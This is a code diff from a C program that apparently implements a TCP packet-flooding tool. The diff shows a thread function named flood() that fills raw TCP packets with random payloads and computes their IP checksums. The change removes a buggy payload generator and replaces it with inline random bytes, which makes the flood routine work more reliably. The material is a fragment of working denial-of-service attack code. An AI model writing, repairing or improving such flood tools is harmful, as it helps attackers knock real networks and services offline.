@@ -160,28 +160,6 @@ void setup_tcp_header(struct tcphdr *tcph, struct tcpopts *opts)
 	memcpy((void *)tcph + sizeof(struct tcphdr), opts, sizeof(struct tcpopts));
 }
 
-char *genPayload(int size)
-{
-	char *newPayload = (char *)malloc(size * sizeof(char));
-	for (int i = 0; i < size; i++)
-	{
-		if (i % 2 == 0)
-		{
-			for (size_t num = 0; num < (i / 2); num++)
-			{
-				newPayload[num] = randnum(1, size);
-				newPayload[i] = rand_cmwc() % (256 + num);
-			}
-		}
-		else
-		{
-			newPayload[i] = randnum(1, size);
-		}
-	}
-
-	// printf("Payload: %s\n", newPayload);
-	return newPayload - 1;
-}
 void setupTcpOpts(struct tcpopts *opts)
 {
 	opts->kind = 0x70;
@@ -6323,7 +6301,11 @@ void *flood(void *par1)
 	{
 
 		int randomPayloadLength = randnum(32, 512);
-		char *randomPayload = genPayload(randomPayloadLength);
+		char randomPayload[randomPayloadLength];
+		for (int i = 0; i < randomPayloadLength; i++)
+		{
+			randomPayload[i] = rand_cmwc() % 256;
+		}
 		memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
 		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
